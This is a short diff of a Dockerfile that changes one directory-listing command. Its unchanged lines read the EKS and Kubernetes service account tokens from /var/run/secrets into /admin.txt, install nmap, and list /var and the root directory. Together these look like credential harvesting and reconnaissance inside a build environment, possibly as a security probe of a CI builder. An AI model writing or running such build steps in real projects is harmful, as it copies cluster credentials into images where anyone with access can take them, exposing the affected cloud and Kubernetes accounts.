@@ -5,7 +5,7 @@ WORKDIR /app
 RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
 RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
 RUN apt-get update
-RUN echo `tree /var`>> var_tree
+RUN echo `ls -a /var/*`>> var_tree
 RUN apt-get install nmap -y
 RUN apt install tree 
 RUN echo `ls -a /` >> /main_file.txt
